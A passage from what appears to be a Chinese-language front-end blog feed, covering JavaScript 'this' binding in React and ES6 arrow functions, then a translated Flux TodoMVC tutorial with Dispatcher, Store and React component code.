<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">constructor</span>(props) &#123;</div><div class="line">  <span class="keyword">super</span>(props);</div><div class="line">  <span class="keyword">this</span>.state = &#123;</div><div class="line">    searchQuery: <span class="string">'initSearchQuery'</span></div><div class="line">  &#125;;</div><div class="line">  <span class="comment">// this绑定后，使handleChange内部this指向当前组件实例，不绑定的话，this为null</span></div><div class="line">  <span class="keyword">this</span>.handleChange = <span class="keyword">this</span>.handleChange.bind(<span class="keyword">this</span>);</div><div class="line">&#125;</div><div class="line">handleChange(event) &#123;</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">'handleChange'</span>, event.target.value);</div><div class="line">  <span class="comment">// 这里需要用到this</span></div><div class="line">  <span class="keyword">this</span>.setState(&#123;</div><div class="line">    searchQuery: event.target.value</div><div class="line">  &#125;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>而在ES6中新增了箭头函数，似乎是默认做了bind绑定:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">constructor</span>(props) &#123;</div><div class="line">  <span class="keyword">super</span>(props);</div><div class="line">  <span class="keyword">this</span>.state = &#123;</div><div class="line">    searchQuery: <span class="string">'initSearchQuery'</span></div><div class="line">  &#125;;</div><div class="line">  <span class="comment">// this.handleChange = this.handleChange.bind(this);</span></div><div class="line">&#125;</div><div class="line">handleChange = (event) =&gt; &#123;</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">'handleChange'</span>, event.target.value);</div><div class="line">  <span class="keyword">this</span>.setState(&#123;</div><div class="line">    searchQuery: event.target.value</div><div class="line">  &#125;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>当然从本质上讲的话，其实是向函数内部隐式地传送了外部的this:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// ES6</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  setTimeout( () =&gt; &#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">"id:"</span>, <span class="keyword">this</span>.id);</div><div class="line">  &#125;,<span class="number">100</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// ES5</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> _this = <span class="keyword">this</span>;</div><div class="line"></div><div class="line">  setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">"id:"</span>, _this.id);</div><div class="line">  &#125;, <span class="number">100</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<hr>
<p>今天在JS群里看到一道不错的笔试题，刚好来分享一下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">this</span>.a = <span class="number">0</span>;</div><div class="line">  <span class="keyword">this</span>.b = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.a);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">fun.prototype = &#123;</div><div class="line">  b: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">this</span>.a = <span class="number">20</span>;</div><div class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.a);</div><div class="line">  &#125;,</div><div class="line">  c: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">this</span>.a = <span class="number">30</span>;</div><div class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.a);</div><div class="line"> &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">var</span> my_fun = <span class="keyword">new</span> fun(); <span class="comment">// new绑定，fun()中的this指向本身</span></div><div class="line">my_fun.b(); <span class="comment">// b方法有两个，一个是my_fu本身，一个位于原型链上，先调用本身的，答案是0</span></div><div class="line">my_fun.c(); <span class="comment">// 本身没有，沿着原型链向上查找，30</span></div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;this总是让人感到有些费解，在阅读一些代码时时不时就冒出来让人丈二和尚摸不着头脑。由于受到一些其他语言的影响，比如Java类中的this是引用自身的指针，曾让我一度认为一切皆对象的JavaScript中函数的this也指向函数本身，这是完全错误的！一个很简单的测试：&lt;/p&gt;
&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;test&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;); &lt;span class=&quot;comment&quot;&gt;// 输出 window 对象, &#39;use strict&#39;模式下是undefined&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.x = &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;test();&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(&lt;span class=&quot;built_in&quot;&gt;window&lt;/span&gt;.x); &lt;span class=&quot;comment&quot;&gt;// 2, &#39;use strict&#39;模式下TypeError&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;我们可以很明显地看到this指向的是全局window对象，而不是函数自己。实际上，this是在运行时进行绑定的，并不是在编写时绑定的，它的上下文取决于函数调用时的各种条件。this的绑定与函数声明的位置没有任何关系，只取决于函数的调用方式。&lt;/p&gt;
    
    </summary>
    
      <category term="前端基本功" scheme="http://blackganglion.com/categories/%E5%89%8D%E7%AB%AF%E5%9F%BA%E6%9C%AC%E5%8A%9F/"/>
    
    
      <category term="JavaScript基础" scheme="http://blackganglion.com/tags/JavaScript%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>[译]构建基于Flux的TodoList</title>
    <link href="http://blackganglion.com/2016/03/02/%E8%AF%91-%E6%9E%84%E5%BB%BA%E5%9F%BA%E4%BA%8EFlux%E7%9A%84TodoList/"/>
    <id>http://blackganglion.com/2016/03/02/译-构建基于Flux的TodoList/</id>
    <published>2016-03-01T16:09:00.000Z</published>
    <updated>2016-07-15T05:30:41.000Z</updated>
    
    <content type="html"><![CDATA[<p>原文地址: <a href="https://facebook.github.io/flux/docs/todo-list.html" target="_blank" rel="external">https://facebook.github.io/flux/docs/todo-list.html</a></p>
<p><img src="http://cc.cocimg.com/api/uploads/20150928/1443408513171463.jpg" alt=""></p>
<p>让我们用一个经典的TodoMVC的应用的简单代码来展示一下Flux的结构体系。虽然完整的项目案例你可以在Github中<a href="https://github.com/facebook/flux/tree/master/examples/flux-todomvc/" target="_blank" rel="external">下载</a>得到，但是还是让我们一步步来完成开发。</p>
<a id="more"></a>
<p>最开始，我们需要一些模板和模块。基于CommonJS的Node模块系统与<a href="https://github.com/petehunt/react-boilerplate" target="_blank" rel="external">react-boilerplate</a>十分适合，有利于快速启动与构建。假设你已经安装了npm，将react-boilerplate从GitHub上clone下来，从终端进入文件根目录，运行npm命令<code>npm install</code>, 然后<code>npm run build</code>, 最后<code>npm start</code>利用Browserify进行构建。</p>
<p>TodoMVC能够在此之中很好地构建，但是你需要确认react-boilerplate的package.json与TodoMVC示例的package.json具有相同的文件结构与依赖描述，否则你的代码将于下面的说明不相符合。</p>
<h2 id="源代码结构"><a href="#源代码结构" class="headerlink" title="源代码结构"></a>源代码结构</h2><p><code>index.html</code>文件是我们应用的顶端入口，其加载了<code>bundle.js</code>结果文件。我们会写入很多自己的代码到js文件夹中，这时Browserify就会帮助我们进行模块打包。当我们现在查看应用的目录，是下面这样的:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">myapp</div><div class="line">  |</div><div class="line">  + ...</div><div class="line">  + js</div><div class="line">    |</div><div class="line">    + app.js</div><div class="line">    + bundle.js  // 当我们修改js文件后，Browserify会重新打包生成bundle.js</div><div class="line">  + index.html</div><div class="line">  + ...</div></pre></td></tr></table></figure>
<p>然后我们进入js文件目录，应用的主要目录结构如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">myapp</div><div class="line">  |</div><div class="line">  + ...</div><div class="line">  + js</div><div class="line">    |</div><div class="line">    + actions</div><div class="line">    + components // 所有React的组件, 包括视图和视图控制器</div><div class="line">    + constants</div><div class="line">    + dispatcher</div><div class="line">    + stores</div><div class="line">    + app.js</div><div class="line">    + bundle.js</div><div class="line">  + index.html</div><div class="line">  + ...</div></pre></td></tr></table></figure>
<h2 id="创建Dispatcher-调度"><a href="#创建Dispatcher-调度" class="headerlink" title="创建Dispatcher(调度)"></a>创建Dispatcher(调度)</h2><p><img src="http://cc.cocimg.com/api/uploads/20150928/1443408151189585.jpg" alt=""></p>
<p>现在我们准备创建一个Dispatcher，这里有一个Dispatcher类的原生例子，使用了Jake Archibald的<a href="https://github.com/jakearchibald/ES6-Promises" target="_blank" rel="external">ES6-Promises</a>模块。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"> <span class="keyword">var</span> <span class="built_in">Promise</span> = <span class="built_in">require</span>(<span class="string">'es6-promise'</span>).Promise;</div><div class="line"> <span class="keyword">var</span> assign = <span class="built_in">require</span>(<span class="string">'object-assign'</span>);</div><div class="line"></div><div class="line"> <span class="keyword">var</span> _callbacks = [];</div><div class="line"> <span class="keyword">var</span> _promises = [];</div><div class="line"> <span class="keyword">var</span> Dispatcher = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;;</div><div class="line"> <span class="comment">// object-assign 所有自身可枚举属性复制，Dispatcher.prototype与&#123;register, dispatch...&#125;复制给&#123;&#125;</span></div><div class="line"> Dispatcher.prototype = assign(&#123;&#125;, Dispatcher.prototype, &#123;</div><div class="line"></div><div class="line">  <span class="comment">/**</span></div><div class="line">   * 注册一个Store的回调函数使其能响应action</div><div class="line">   * @param &#123;function&#125; 要被注册的callback函数</div><div class="line">   * @return &#123;number&#125; _callback数组的下标值</div><div class="line">   */</div><div class="line">  register: <span class="function"><span class="keyword">function</span>(<span class="params">callback</span>) </span>&#123;</div><div class="line">    _callbacks.push(callback);</div><div class="line">    <span class="keyword">return</span> _callbacks.length - <span class="number">1</span>; <span class="comment">// index</span></div><div class="line">  &#125;,</div><div class="line"></div><div class="line">  <span class="comment">/**</span></div><div class="line">   * 调度</div><div class="line">   * @param &#123;object&#125; payload 来自于action的数据</div><div class="line">   */</div><div class="line">  dispatch: <span class="function"><span class="keyword">function</span>(<span class="params">payload</span>) </span>&#123;</div><div class="line">    <span class="comment">// 首先使每个callback对应一个promise</span></div><div class="line">    <span class="keyword">var</span> resolves = [];</div><div class="line">    <span class="keyword">var</span> rejects = [];</div><div class="line">    _promises = _callbacks.map(<span class="function"><span class="keyword">function</span>(<span class="params">_, i</span>) </span>&#123;</div><div class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</div><div class="line">        resolves[i] = resolve;</div><div class="line">        rejects[i] = reject;</div><div class="line">      &#125;);</div><div class="line">    &#125;);</div><div class="line">    <span class="comment">// 遍历callback数组，向每个callback传入payload，callback成功执行就将参数传入resolve中</span></div><div class="line">    _callbacks.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">callback, i</span>) </span>&#123;</div><div class="line">      <span class="comment">// 将callback(payload)的返回对象转换为promise对象</span></div><div class="line">      <span class="comment">// 关注下文的waitFor()</span></div><div class="line">      <span class="built_in">Promise</span>.resolve(callback(payload)).then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">        <span class="comment">// 向resolve传入参数</span></div><div class="line">        resolves[i](payload);</div><div class="line">      &#125;, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">        <span class="comment">// 向reject传入参数</span></div><div class="line">        rejects[i](<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'Dispatcher callback unsuccessful'</span>));</div><div class="line">      &#125;);</div><div class="line">    &#125;);</div><div class="line">    _promises = [];</div><div class="line">  &#125;</div><div class="line">&#125;);</div><div class="line"></div><div class="line"><span class="built_in">module</span>.exports = Dispatcher;</div></pre></td></tr></table></figure>
<p>基础Dispatcher的公共API仅有两个方法组成: register()与dispatch()，我们将使用register()去注册每一个store的回调函数，使用dispatch()让action触发callback的回调。</p>
<p>对于我们的应用而言需要创建一个更为完善的调度，称为<code>AppDispatcher</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> Dispatcher = <span class="built_in">require</span>(<span class="string">'./Dispatcher'</span>);</div><div class="line"><span class="keyword">var</span> assign = <span class="built_in">require</span>(<span class="string">'object-assign'</span>);</div><div class="line"></div><div class="line"><span class="keyword">var</span> AppDispatcher = assign(&#123;&#125;, Dispatcher.prototype, &#123;</div><div class="line">  <span class="comment">/**</span></div><div class="line">   * 连接view与dispatcher的方法，传入action</div><div class="line">   * @param &#123;object&#125; action 来自view的数据</div><div class="line">   */</div><div class="line">  handleViewAction: <span class="function"><span class="keyword">function</span>(<span class="params">action</span>) </span>&#123;</div><div class="line">    <span class="comment">// &#123; source: 'VIEW_ACTION', action: action &#125;作为payload传入</span></div><div class="line">    <span class="keyword">this</span>.dispatch(&#123;</div><div class="line">      source: <span class="string">'VIEW_ACTION'</span>,</div><div class="line">      action: action</div><div class="line">    &#125;);</div><div class="line">  &#125;</div><div class="line">&#125;);</div><div class="line"></div><div class="line"><span class="built_in">module</span>.exports = AppDispatcher;</div></pre></td></tr></table></figure>
<p>对于我们的需求而言现在已经比较完善了，建立了一个处理view action的函数。之后我们也可以对此进行扩展，比如对服务器数据进行更新，虽然我们目前还不需要。</p>
<h2 id="创建Stores-存储"><a href="#创建Stores-存储" class="headerlink" title="创建Stores(存储)"></a>创建Stores(存储)</h2><p>我们使用node的EventEmitter去开展一个Store，我们需要EventEmitter向controller-views广播’change’事件。为了更为清楚地表达目的，我省去了部分代码，详细的可见<a href="https://github.com/facebook/flux/blob/master/examples/flux-todomvc/js/stores/TodoStore.js" target="_blank" rel="external">TodoStore.js</a></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> AppDispatcher = <span class="built_in">require</span>(<span class="string">'../dispatcher/AppDispatcher'</span>);</div><div class="line"><span class="keyword">var</span> EventEmitter = <span class="built_in">require</span>(<span class="string">'events'</span>).EventEmitter;</div><div class="line"><span class="keyword">var</span> TodoConstants = <span class="built_in">require</span>(<span class="string">'../constants/TodoConstants'</span>);</div><div class="line"><span class="keyword">var</span> assign = <span class="built_in">require</span>(<span class="string">'object-assign'</span>);</div><div class="line"></div><div class="line"><span class="keyword">var</span> CHANGE_EVENT = <span class="string">'change'</span>;</div><div class="line"></div><div class="line"><span class="keyword">var</span> _todos = &#123;&#125;; <span class="comment">// todo单元的集合</span></div><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line"> * 创建一个TODO单元，包括id，complete，text</div><div class="line"> * @param &#123;string&#125; text TODO的内容</div><div class="line"> */</div><div class="line"> <span class="function"><span class="keyword">function</span> <span class="title">create</span>(<span class="params">text</span>) </span>&#123;</div><div class="line">  <span class="comment">// 使用时间戳代替真实的id</span></div><div class="line">  <span class="keyword">var</span> id = <span class="built_in">Date</span>.now();</div><div class="line">  _todos[id] = &#123;</div><div class="line">    id: id,</div><div class="line">    complete: <span class="literal">false</span>,</div><div class="line">    text: text</div><div class="line">  &#125;;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line"> * 根据id删除TODO单元</div><div class="line"> * @param &#123;string&#125; id</div><div class="line"> */</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">destroy</span>(<span class="params">id</span>) </span>&#123;</div><div class="line">  <span class="keyword">delete</span> _todos[id];</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">var</span> TodoStore = assign(&#123;&#125;, EventEmitter.prototype, &#123;</div><div class="line"></div><div class="line">  <span class="comment">/**</span></div><div class="line">   * 得到TODOs的整个集合</div><div class="line">   * @return &#123;object&#125;</div><div class="line">   */</div><div class="line">  getAll: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> _todos;</div><div class="line">  &#125;,</div><div class="line"></div><div class="line">  <span class="comment">// 触发change事件</span></div><div class="line">  emitChange: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">this</span>.emit(CHANGE_EVENT);</div><div class="line">  &#125;,</div><div class="line"></div><div class="line">  <span class="comment">/**</span></div><div class="line">   * 将callback注册change事件</div><div class="line">   * @param &#123;function&#125; callback</div><div class="line">   */</div><div class="line">  addChangeListener: <span class="function"><span class="keyword">function</span>(<span class="params">callback</span>) </span>&#123;</div><div class="line">    <span class="keyword">this</span>.on(CHANGE_EVENT, callback);</div><div class="line">  &#125;,</div><div class="line"></div><div class="line">  <span class="comment">/**</span></div><div class="line">   * 移除callback的change事件</div><div class="line">   * @param &#123;function&#125; callback</div><div class="line">   */</div><div class="line">  removeChangeListener: <span class="function"><span class="keyword">function</span>(<span class="params">callback</span>) </span>&#123;</div><div class="line">    <span class="keyword">this</span>.removeListener(CHANGE_EVENT, callback);</div><div class="line">  &#125;,</div><div class="line"></div><div class="line">  <span class="comment">// 调度注册，AppDispatcher是flux内部的注册器，上文有所简化</span></div><div class="line">  dispatcherIndex: AppDispatcher.register(<span class="function"><span class="keyword">function</span>(<span class="params">payload</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> action = payload.action;</div><div class="line">    <span class="keyword">var</span> text;</div><div class="line"></div><div class="line">    <span class="keyword">switch</span>(action.actionType) &#123;</div><div class="line">      <span class="comment">// TodoConstants中是TODO各种状态对应的键值</span></div><div class="line">      <span class="keyword">case</span> TodoConstants.TODO_CREATE:</div><div class="line">        text = action.text.trim();</div><div class="line">        <span class="keyword">if</span> (text !== <span class="string">''</span>) &#123;</div><div class="line">          create(text);</div><div class="line">          TodoStore.emitChange();</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line"></div><div class="line">      <span class="keyword">case</span> TodoConstants.TODO_DESTROY:</div><div class="line">        destroy(action.id);</div><div class="line">        TodoStore.emitChange();</div><div class="line">        <span class="keyword">break</span>;</div><div class="line"></div><div class="line">      <span class="comment">// 更多的动作选项在这里就省略了</span></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// 没有出错，返回true使Dispatcher的promise更改状态</span></div><div class="line">  &#125;)</div><div class="line">&#125;);</div><div class="line"></div><div class="line"><span class="built_in">module</span>.exports = TodoStore;</div></pre></td></tr></table></figure>
<p>这里有许多重要的事情需要记录一下。我们开始维护<code>_todos</code>的数据结构，其内涵了每一个单独的to-do。虽然<code>_todos</code>存在于<code>TodoStore</code>的外部，但依然位于模块的作用域内，它依然是私有的，无法被模块外部所直接修改。这样没有action就不可能直接更新store了。</p>
<p>另外一个重要的部分是在dispatcher中注册store的callback。我们将带有payload的回调函数传入dispatcher以及在dispatcher内部保护store的索引。callback目前只有两种action类型，但你可以按照你的需求来添加。</p>
<h2 id="监听Controller-View的改变"><a href="#监听Controller-View的改变" class="headerlink" title="监听Controller-View的改变"></a>监听Controller-View的改变</h2><p>我们需要一个在各个组件顶部的React组件去监听store的变化。在大型的应用中，我们会拥有更多这样的监听组件，或许是每一个页面的任何部分都会拥有。在Facebook的创建工具中，我们拥有许多类似于控制器的视图(controller-like views)，每一个都管理着它所从属的UI。在视频回放编辑器中，我们仅仅拥有两个：一个是动画预览，一个是图片选择接口。这里是我们TodoMVC的例子，这里依然是删减过的，详细代码请见<a href="https://github.com/facebook/flux/blob/master/examples/flux-todomvc/js/components/TodoApp.react.js" target="_blank" rel="external">TodoApp.react.js</a></p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> Footer = <span class="built_in">require</span>(<span class="string">'./Footer.react'</span>);</div><div class="line"><span class="keyword">var</span> Header = <span class="built_in">require</span>(<span class="string">'./Header.react'</span>);</div><div class="line"><span class="keyword">var</span> MainSection = <span class="built_in">require</span>(<span class="string">'./MainSection.react'</span>);</div><div class="line"><span class="keyword">var</span> React = <span class="built_in">require</span>(<span class="string">'react'</span>);</div><div class="line"><span class="keyword">var</span> TodoStore = <span class="built_in">require</span>(<span class="string">'../stores/TodoStore'</span>);</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">getTodoState</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> &#123;</div><div class="line">    allTodos: TodoStore.getAll()</div><div class="line">  &#125;;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">var</span> TodoApp = React.createClass(&#123;</div><div class="line"></div><div class="line">  <span class="comment">// 初始化status</span></div><div class="line">  getInitialState: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> getTodoState();</div><div class="line">  &#125;,</div><div class="line"></div><div class="line">  <span class="comment">// onChange事件，每当触发这个事件时，将Todo的状态更改一遍</span></div><div class="line">  _onChange: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">this</span>.setState(getTodoState());</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="comment">// 组件已经插入DOM，为TodoStore添加onChange事件</span></div><div class="line">  componentDidMount: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    TodoStore.addChangeListener(<span class="keyword">this</span>._onChange);</div><div class="line">  &#125;,</div><div class="line"></div><div class="line">  <span class="comment">// 组件将要被移出DOM，将onChange事件移除</span></div><div class="line">  componentWillUnmount: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    TodoStore.removeChangeListener(<span class="keyword">this</span>._onChange);</div><div class="line">  &#125;,</div><div class="line"></div><div class="line">  <span class="comment">/**</span></div><div class="line">   * @return &#123;object&#125;</div><div class="line">   */</div><div class="line">  render: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> (</div><div class="line">      &lt;div&gt;</div><div class="line">        &lt;Header /&gt;</div><div class="line">        &lt;MainSection</div><div class="line">          allTodos=&#123;this.state.allTodos&#125;</div><div class="line">          areAllComplete=&#123;this.state.areAllComplete&#125;</div><div class="line">        /&gt;</div><div class="line">        &lt;Footer allTodos=&#123;this.state.allTodos&#125; /&gt;</div><div class="line">      &lt;/div&gt;</div><div 